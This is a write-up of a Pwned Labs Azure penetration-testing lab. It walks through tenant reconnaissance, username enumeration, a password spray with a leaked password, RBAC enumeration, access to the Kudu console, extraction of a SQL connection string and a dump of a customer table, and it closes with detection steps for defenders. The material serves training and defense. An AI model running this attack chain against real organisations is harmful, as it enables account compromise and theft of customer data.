---
title: Azure Recon to Foothold and Profit
description: Azure Recon to Foothold and Profit
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
Mega Big Tech, a leading player in the Tech development industry, has recently transitioned to a hybrid cloud model. They maintain a robust on-premise Active Directory domain while leveraging the capabilities of Azure cloud services. Given their prominence in the tech sector, they are acutely aware of potential cyber threats and are keen on fortifying their defenses. Your team, renowned for its expertise in cybersecurity, has been approached by Mega Big Tech to conduct a comprehensive penetration test on their infrastructure. we have only been given the domain name megabigtech.com, with this information we will have to enumerate as many assets as possible and manage to get in into Mega Big Tech infrastructure.

🚨 MegaBigTech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).

# Walkthrough
We are only given domain `megabigtech.com` and [possible leak on Pastebin](https://pastebin.com/ZfqZdpX8). Therefore we need to gather information about company's resources.

We can manually check if the company is using Entra ID by browsing URL below
```
https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&xml=1
```

We can see that `NameSpaceType` is set to `Managed` meaning that the company uses Entra ID as identity platform. This endpoint is used by Microsoft to determine the type of account associated with that username, when username is entered to Microsoft sign-in page. It's called `user realm discovery` - `GetUserRealm.srf`.

![](azure-recon-to-foothold-and-profit-1.png)


We can get more infromation about Tenant by visiting URL below. The `.well-known/openid-configuration` endpoint is used in the context of OpenID Connect (OIDC), which is an identity layer on top of the OAuth 2.0 protocol. It's used to discover how to interact with the identity provider's OAuth 2.0 and OpenID Connect services (in this case, Microsoft's Azure identity platform). 

```
https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration
```

It shows that Tenant ID `2590ccef-687d-493b-ae8d-441cbab63a72`.

![](azure-recon-to-foothold-and-profit-2.png)

We can also perform enumeration using [AADInternals](https://github.com/Gerenios/AADInternals). We can get login information about the domain with the following command:

```
└─PS> Get-AADIntLoginInformation -Domain megabigtech.com

Desktop Sso Enabled                  : True
Consumer Domain                      : 
Federation Brand Name                : Default Directory
Federation Metadata Url              : 
Domain Name                          : megabigtech.com
Federation Active Authentication Url : 
Cloud Instance audience urn          : urn:federation:MicrosoftOnline
Exists                               : 1
Has Password                         : True
State                                : 4
Authentication Url                   : 
Tenant Banner Illustration           : 
Account Type                         : Managed
Cloud Instance                       : microsoftonline.com
User State                           : 1
Federation Protocol                  : 
Federation Global Version            : 
Tenant Banner Logo                   : 
Domain Type                          : 3
Throttle Status                      : 0
Tenant Locale                        : 
Pref Credential                      : 1

```

To retrieve Tenant ID
```
└─PS> Get-AADIntTenantID -Domain megabigtech.com                                                                                                                                                                                            
2590ccef-687d-493b-ae8d-441cbab63a72
```

In the past, it was possible to use `Invoke-AADIntReconAsOutsider -DomainName megabigtech.com` to [get other domains registered in Tenant](https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider), but unfortunately,  it was [patched](https://techcommunity.microsoft.com/blog/exchange/important-update-to-the-get-federationinformation-cmdlet-in-exchange-online/4410095). So now it only return the following info
```
└─PS> Invoke-AADIntReconAsOutsider -DomainName megabigtech.com                                                                                                                                                                              
Tenant brand:       Default Directory                                                                                   
Tenant name:                                                                                                            
Tenant id:          2590ccef-687d-493b-ae8d-441cbab63a72                                                                
Tenant region:      EU                                                                                                  
DesktopSSO enabled: True                                                                                                
Get-TenantSubscope: /home/kali/.local/share/powershell/Modules/AADInternals/0.9.8/KillChain_utils.ps1:266               
Line |                                                                                                                  
 266 |  …            $SubScope = Get-TenantSubscope -Domain $User.Split("@")[1]                                         
     |                                                      ~~~~~~~~~~~~~~~~~~~                                         
     | Cannot bind argument to parameter 'Domain' because it is an empty string.                                        
WARNING: Requests throttled!                                                                                            
                                                                                                                        
Name    : megabigtech.com                                                                                               
DNS     : False                                                                                                         
MX      : False                                                                                                         
SPF     : False                                                                                                         
DMARC   :                                                                                                               
DKIM    : False                                                                                                         
MTA-STS : False                                                                                                         
Type    : Managed                                                                                                       
STS     :   
```

So now we need to gather information about possible users to perform phishing or password spray attack. We can use [BridgeKeeper](https://github.com/0xZDH/BridgeKeeper), which will scrape employee names from Social Media sources.

We also need to enumerate if the target organization is using any of the services by looking for such subdomains. We can use [AzSubEnum](https://github.com/yuyudhn/AzSubEnum), which is tailored for enumerating Azure services. 
```
└─$ python3 azsubenum.py -b megabigtech --thread 10

Discovered Subdomains:

App Services - Management:
---------------------------------------
megabigtech.scm.azurewebsites.net      

App Services:
-----------------------------------
megabigtech.azurewebsites.net      

```

We see that there's a website in `azurewebsites.net`, which is default domain for Azure App Serivce web apps. Other well known domains can be viewed [here](https://learn.microsoft.com/en-us/azure/security/fundamentals/azure-domains).

![](azure-recon-to-foothold-and-profit-3.png)

The web app reveals useful information regarding employees, their roles, email formats.
```
yuki.tanaka@megabigtech.com
yamamoto.sota@megabigtech.com
takahashi.hina@megabigtech.com
kato.sara@megabigtech.com
```

Now we can use [Omnispray](https://github.com/0xZDH/Omnispray) to enumerate valid usernames. 
```
└─$ python3 omnispray.py --type enum -uf users.list --module o365_enum_office
/home/kali/tools/cloud/azure/Omnispray/core/utils.py:107: SyntaxWarning: invalid escape sequence '\.'
  return re.fullmatch('[^@]+@[^@]+\.[^@]+', user)

            *** Omnispray ***            

>---------------------------------------<

   > version        :  0.1.4
   > module         :  o365_enum_office
   > type           :  enum
   > userfile       :  users.list
   > count          :  1 passwords/spray
   > lockout        :  15.0 minutes
   > wait           :  5.0
   > timeout        :  25 seconds
   > pause          :  0.25 seconds
   > rate           :  10 threads
   > start          :  2025-08-24 18:20:45

>---------------------------------------<

/home/kali/tools/cloud/azure/Omnispray/omnispray.py:319: DeprecationWarning: There is no current event loop
  loop = asyncio.get_event_loop()
[2025-08-24 18:20:45,109] INFO : Generating prerequisite data via office.com...
[2025-08-24 18:20:48,206] INFO : Enumerating 4 users via 'o365_enum_office' module
[2025-08-24 18:20:49,279] INFO : [ + ] yuki.tanaka@megabigtech.com
<SNIP>
```

For credential stuffing attack we can use [MSOLSpray](https://github.com/dafthack/MSOLSpray), Omnispray, Oh365UserFinder, TeamFiltration tools. Pass the valid username in a text file and the password from Pastebin. 
```
└─$ python3 oh365userfinder.py --pwspray --elist ~/pwnedlabs/azure/users.list -p 'MegaDev79$'  

   ____  __   _____ _____ ______   __  __                  _______           __
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/

                                   Version 1.1.2
                               A project by The Mayor
                        Oh365UserFinder.py -h to get started

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Sun Aug 24 18:28:38 2025
                                                                                                                                                                                                                                            
[+] yuki.tanaka@megabigtech.com                  Result -                VALID PASSWORD! [+]

```

> Often it's not possible to just log directly into a tenant over the Internet as MFA is getting more commonplace. Other guided labs from Pwned Labs explore how to check for MFA enablement gaps and gain access.
{: .prompt-info }

Now that we have valid credentials, we can try to enumerate Entra ID environment. Let's login first via `Connect-AzAccount` and `Connect-MgGraph` to connect to the Tenant. We can also use `az login`

We can enumerate all users with following command
```
└─PS> Get-AzADUser

DisplayName                                                 Id                                   Mail                            UserPrincipalName
-----------                                                 --                                   ----                            -----------------
Akari Fukimo                                                f99e0d7f-3e0f-41ce-8fcb-cf7ac49995d1                                 Akari.Fukimo@megabigtech.com
Akira Suzuki                                                4e96be22-f417-49b5-9f98-b74f8258c8ae                                 Akira.Suzuki@megabigtech.com
Angelina Lee                                                a2e5eb93-7d64-40d8-9e23-715a9cca5112                                 alee@megabigtech.com
Alex Rivera                                                 69111b7a-6ae9-4039-aca2-558d6fe8d902                                 alex.rivera@megabigtech.com
Alexandra Wu                                                e00d3fec-e7c4-4efa-bc92-e5db39127a99                                 Alexandra.Wu@megabigtech.com
Alice Garcia                                                f78536e6-c5ba-4c4e-ae74-eab2a1a34e96                                 Alice.Garcia@megabigtech.com
<SNIP>
```


We can retrieve current user's information to find possible responsibilities and relationships within the company
```
└─PS> Get-AzADUser -UserPrincipalName 'yuki.tanaka@megabigtech.com' | fl

AccountEnabled                  : 
AgeGroup                        : 
ApproximateLastSignInDateTime   : 
BusinessPhone                   : {}
City                            : 
CompanyName                     : 
ComplianceExpirationDateTime    : 
ConsentProvidedForMinor         : 
Country                         : 
CreatedDateTime                 : 
CreationType                    : 
DeletedDateTime                 : 
Department                      : 
DeviceVersion                   : 
DisplayName                     : Yuki Tanaka
EmployeeHireDate                : 
EmployeeId                      : 
EmployeeOrgData                 : {
                                  }
EmployeeType                    : 
ExternalUserState               : 
ExternalUserStateChangeDateTime : 
FaxNumber                       : 
GivenName                       : Yuki
Id                              : 7d0cfca3-b00e-424c-bf13-d7c2f0869901
Identity                        : 
ImAddress                       : 
IsResourceAccount               : 
JobTitle                        : Senior Developer
LastPasswordChangeDateTime      : 
LegalAgeGroupClassification     : 
Mail                            : 
MailNickname                    : 
Manager                         : {
                                  }
MobilePhone                     : 
OdataId                         : 
OdataType                       : #microsoft.graph.user
OfficeLocation                  : 
OnPremisesImmutableId           : 
OnPremisesLastSyncDateTime      : 
OnPremisesSyncEnabled           : 
OperatingSystem                 : 
OperatingSystemVersion          : 
OtherMail                       : 
PasswordPolicy                  : 
PasswordProfile                 : {
                                  }
PhysicalId                      : 
PostalCode                      : 
PreferredLanguage               : 
ProxyAddress                    : 
ResourceGroupName               : 
ShowInAddressList               : 
SignInSessionsValidFromDateTime : 
State                           : 
StreetAddress                   : 
Surname                         : Tanaka
TrustType                       : 
UsageLocation                   : 
UserPrincipalName               : yuki.tanaka@megabigtech.com
UserType                        : 
AdditionalProperties            : {[id, 7d0cfca3-b00e-424c-bf13-d7c2f0869901]}

```

it doesn't seem like current has any resources
```
└─PS> Get-MgUserOwnedObject -UserId "yuki.tanaka@megabigtech.com"

```

We can check group memberships. Seems like we have `webApp_Dev` group membership
```
└─PS> Get-MgUserMemberOf -UserId "yuki.tanaka@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}                                                                     

$_.AdditionalProperties["displayName"]
--------------------------------------
webApp_Dev
Directory Readers
Default Directory
Yolo-MFA

```

If we check roles assigned, which grants us to read basic directory information.
```
$userEmail = "yuki.tanaka@megabigtech.com"
$user = Get-MgUser -Filter "userPrincipalName eq '$userEmail'"

$directoryRoles = Get-MgDirectoryRole

$userRoleNames = @()

foreach ($role in $directoryRoles) {
    $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id
    if ($members.Id -contains $user.Id) {
        $userRoleNames += $role.DisplayName
    }
}
```
```
└─PS> $userRoleNames
Directory Readers

```

There's no more interesting information. Now, let's switch to Azure Subscription and enumerate RBAC roles. We have to use `Az` PowerShell module. Basic enumeration on an attacker-owned or target system:
- `Get-AzContext` - retrieves the current authentication context for Azure Resource Manager requests
- `Get-AzContext -ListAvailable` - returns all available contexts
- `Select-AzContext` - allows to impersonate the session, when operating on a target machine (if the user hasn't executed the `Disconnect-AzAccount` command, thus session's context remains active)

If we check resources, we find `megabigtechdevapp23` resource
```
└─PS> Get-AzResource

Name              : megabigtechdevapp23
ResourceGroupName : mbt-rg-3
ResourceType      : Microsoft.Web/sites
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23
Tags              : 
                    Name                                            Value                                                                                                                                                                  
                                                                                           
                    ==============================================  =======================================================================================================================================================================
                    =======================================================================
                    hidden-link: /app-insights-conn-string          InstrumentationKey=17f3ab88-9304-48a5-a089-a1baa7344d08;IngestionEndpoint=https://eastus-8.in.applicationinsights.azure.com/;LiveEndpoint=https://eastus.livediagnostic
                    s.monitor.azure.com/;ApplicationId=a163a84d-dfa7-4bb4-a7cb-1d6f1b2893b8
                    hidden-link: /app-insights-instrumentation-key  17f3ab88-9304-48a5-a089-a1baa7344d08                                                                                                                                   
                    hidden-link: /app-insights-resource-id          /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/microsoft.insights/components/megabigtechdevapp23                                

```

To find what RBAC permissions we have run the following command
```
└─PS> Get-AzRoleAssignment -SignInName yuki.tanaka@megabigtech.com                                                                                                                                                                          

RoleAssignmentName : f214c283-06bc-2e7f-5fbd-e2a8ae832f60
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23/providers/Microsoft.Authorization/roleAssignments/f214c283-06bc-2e7f-5fbd-e2a8ae832f60
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23
DisplayName        : Yuki Tanaka
SignInName         : yuki.tanaka@megabigtech.com
RoleDefinitionName : Website Contributor
RoleDefinitionId   : de139f84-1756-47ae-9be6-808fbbe84772
ObjectId           : 7d0cfca3-b00e-424c-bf13-d7c2f0869901
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

```

User has the `Website Contributor` role assigned to the scope of the `` App Service. According [documentation](https://learn.microsoft.com/en-us/azure/app-service/resources-kudu#rbac-permissions-required-to-access-kudu), `Website Contributor` RBAC permission permits to access the [Kudu](https://learn.microsoft.com/en-us/azure/app-service/resources-kudu) console. It provides us with a terminal in which to interact with the underlying operating system. 

Let's get more information about the app
```
└─PS> Get-AzWebApp -Name megabigtechdevapp23                                                                                                                                                                                                
                                                                                                                        
GitRemoteName               :                                                                                           
GitRemoteUri                :                                                                                           
GitRemoteUsername           :                                                                                           
GitRemotePassword           :                                                                                           
AzureStorageAccounts        :                                                                                           
AzureStoragePath            : {}                                                                                        
VnetInfo                    : {b9e5a211-8797-40f2-9466-18d564ab49a2_appservice-subnet}                                  
State                       : Running                                                                                   
HostNames                   : {megabigtechdevapp23.azurewebsites.net}                                                   
RepositorySiteName          : megabigtechdevapp23                                                                       
UsageState                  : Normal                                                                                    
Enabled                     : True                                                                                      
EnabledHostNames            : {megabigtechdevapp23.azurewebsites.net, megabigtechdevapp23.scm.azurewebsites.net}        
AvailabilityState           : Normal                                                                                    
HostNameSslStates           : {megabigtechdevapp23.azurewebsites.net, megabigtechdevapp23.scm.azurewebsites.net}        
ServerFarmId                : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/serverfarms/win-ASP
Reserved                    : False                                                                                     
IsXenon                     : False                                                                                     
HyperV                      :                                                                                           
LastModifiedTimeUtc         : 8/8/2025 4:21:55 AM                                                                       
SiteConfig                  : Microsoft.Azure.Management.WebSites.Models.SiteConfig                                     
TrafficManagerHostNames     :                                                                                           
ScmSiteAlsoStopped          : False                                                                                     
TargetSwapSlot              :                                                                                           
HostingEnvironmentProfile   :                                                                                           
ClientAffinityEnabled       : False                                                                                     
ClientCertEnabled           : False                                                                                     
ClientCertMode              :                                                                                           
ClientCertExclusionPaths    :                                                                                           
HostNamesDisabled           : False                                                                                     
CustomDomainVerificationId  : 3A282EE32866205997C9E047B5811E83180CCA0DF43FCF096008BEDAD07F92EF                          
OutboundIpAddresses         : 20.121.90.241,20.121.91.57,20.121.91.104,20.121.92.26,20.121.92.107,20.121.92.194,20.119.0.40
PossibleOutboundIpAddresses : 20.121.90.241,20.121.91.57,20.121.91.104,20.121.92.26,20.121.92.107,20.121.92.194,135.237.71.71,20.121.93.45,20.121.94.31,20.121.95.0,20.232.240.54,20.85.202.92,20.232.240.251,20.232.241.57,20.232.241.74,2
                              0.232.241.202,20.232.241.224,20.232.242.1,20.232.242.161,20.232.243.151,20.232.243.155,20.232.244.135,20.232.245.120,20.232.245.153,20.232.245.181,20.232.245.227,20.232.245.230,20.232.246.15,20.232.246.19,
                              20.232.246.32,20.232.246.87,20.119.0.40                                                   
ContainerSize               : 0                                                                                         
DailyMemoryTimeQuota        : 0                                                                                         
SuspendedTill               :                                                                                           
MaxNumberOfWorkers          :                                                                                           
CloningInfo                 :                                                                                           
ResourceGroup               : mbt-rg-3                                                                                  
IsDefaultContainer          :                                                                                           
DefaultHostName             : megabigtechdevapp23.azurewebsites.net                                                     
SlotSwapStatus              :                                                                                           
HttpsOnly                   : False                                                                                     
RedundancyMode              :                                                                                           
InProgressOperationId       :                                                                                           
StorageAccountRequired      :                                                                                           
KeyVaultReferenceIdentity   :                                                                                           
VirtualNetworkSubnetId      : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Network/virtualNetworks/produc-app-network/subnets/appservice-subnet
Identity                    :                                                                                           
ExtendedLocation            :                                                                                           
Id                          : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23
Name                        : megabigtechdevapp23                                                                       
Kind                        : app                                                                                       
Location                    : East US                                                                                   
Type                        : Microsoft.Web/sites                                                                       
Tags                        : {[hidden-link: /app-insights-resource-id, /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/microsoft.insights/components/megabigtechdevapp23], [hidden-link: 
                              /app-insights-instrumentation-key, 17f3ab88-9304-48a5-a089-a1baa7344d08], [hidden-link: /app-insights-conn-string, InstrumentationKey=17f3ab88-9304-48a5-a089-a1baa7344d08;IngestionEndpoint=https://eastus-8
                              .in.applicationinsights.azure.com/;LiveEndpoint=https://eastus.livediagnostics.monitor.azure.com/;ApplicationId=a163a84d-dfa7-4bb4-a7cb-1d6f1b2893b8]}
                                                                                                                        
                                                                                  
```

We are interested in `enabledhostnames`: `megabigtechdevapp23.azurewebsites.net, megabigtechdevapp23.scm.azurewebsites.net`. The `megabigtechdevapp23.scm.azurewebsites.net` belongs to Kudu, since it has `scm` in domain name, which is `Source Control Manager`. Visit the `https://megabigtechdevapp23.scm.azurewebsites.net` in browser to access the Kudu site

![](azure-recon-to-foothold-and-profit-4.png)

Click on the `Debug console` drop-down and select `PowerShell` to access console. Now, we can continue with our enumeration. Since this is a Web App, we can assume it interacts with backend resources as [managed identity](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/overview). Thus, we can start enumerating environment variables. Look for `IDENTITY_ENDPOINT` and `IDENTITY_HEADER`, if this is the case we can request token on behalf of the managed identity.

Another option is to check for [connection string](https://learn.microsoft.com/en-us/azure/storage/common/storage-configure-connection-string) that is stored as an environment variable. Thus, we need to list all available variables with the command `env`
```
PS C:\home> env
<SNIP>
APPSETTING_DB=Server=tcp:megabigdevsqlserver.database.windows.net,1433;Initial Catalog=customerdevneddb;User ID=dbuser;Password=<REDACTED>
<SNIP>
DB=Server=tcp:megabigdevsqlserver.database.windows.net,1433;Initial Catalog=customerdevneddb;User ID=dbuser;Password=<REDACTED>
<SNIP>
```

We find a connecting string for an azure SQL instance at the well-known domain `database.windows.net`. We can use `sqlcmd` since it's installed in the current session. Let's enumerate the database
```
PS C:\home> sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
TABLE_NAME                                                                                                                      

--------------------------------------------------------------------------------------------------------------------------------

CustomerData



(1 rows affected)
```

Let's dump the table, which reveals PII (personally identifiable information) of Mega Big Tech customers
```
PS C:\home> sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT * FROM CustomerData"
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT * FROM CustomerData"
ID          FirstName                                          LastName                                           Email                                                                                                CreditCardNumber                

----------- -------------------------------------------------- -------------------------------------------------- ---------------------------------------------------------------------------------------------------- --------------------------------

         20 Haruto                                             Watanabe                                           haruto.watanabe@globalretail.com                                                                     1234567890123456                

         21 Liam                                               Johnson                                            liam.johnson@autoadvance.com                                                                         2345678901234567                

<SNIP>
```
# Defense 
This section is from [lab's defense section](https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit)

Microsoft Graph module is usually used to know user's login information (last logged in timestamps etc.)
```
Install-Module Microsoft.Graph -AllowClobber
Connect-MgGraph -Scope AuditLog.Read.All
```

The `SignInActivity` property gives the most recent interactive and non-interactive sign in
```
$user = Get-MgUser -UserId '7d0cfca3-b00e-424c-bf13-d7c2f0869901' -Property UserPrincipalName,SignInActivity
$user.SignInActivity  | fl
```

Also use the `Get-MgAuditLogSignIn` cmdlet to return all failed signins in a specified duration, which can reveal brute force attacks such as password spraying and credential stuffing.
```
$startDate = (Get-Date).AddDays(-7).ToString("yyyy-MM-ddTHH:mm:ssZ")
$endDate = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
$signIns = Get-MgAuditLogSignIn -Filter "createdDateTime ge $startDate and createdDateTime le $endDate" -All
$failedSignIns = $signIns | Where-Object {
    ($_.Status.ErrorCode -eq 50076) -or ($_.Status.ErrorCode -eq 50158)
}

$userFailedSignInDetails = @{}
foreach ($signIn in $failedSignIns) {

    $userId = $signIn.UserPrincipalName
    $ipAddress = $signIn.IpAddress
    $signInTime = $signIn.CreatedDateTime
    $Application = $signIn.AppDisplayName

    $attemptKey = "$userId|$ipAddress|$signInTime|$Application"

    if ($userFailedSignInDetails.ContainsKey($userId)) {
        $userFailedSignInDetails[$userId] += @($attemptKey)
    } else {
        $userFailedSignInDetails[$userId] = @($attemptKey)
    }
}

foreach ($user in $userFailedSignInDetails.Keys) {
    Write-Output "User: $user"
    $attempts = $userFailedSignInDetails[$user] | Sort-Object -Unique
    Write-Output "Total Failed Sign-Ins: $($attempts.Count)"
    foreach ($attempt in $attempts) {
        $details = $attempt -split '\|'
        Write-Output "Time: $($details[2]), IP: $($details[1]), Service: $($details[3])"
    }
    Write-Output "---------------------------------------------"
}
```
For proactive defense, security defaults are a good baseline. Also, Conditional Access policies and MFA need to be implemented. Moreover, Diagnostic logs in App Service should also be enabled. It could be also beneficial to enable Microsoft Defender for App Service. 

Regarding customers' data, the credit card numbers should definitely have been encrypted!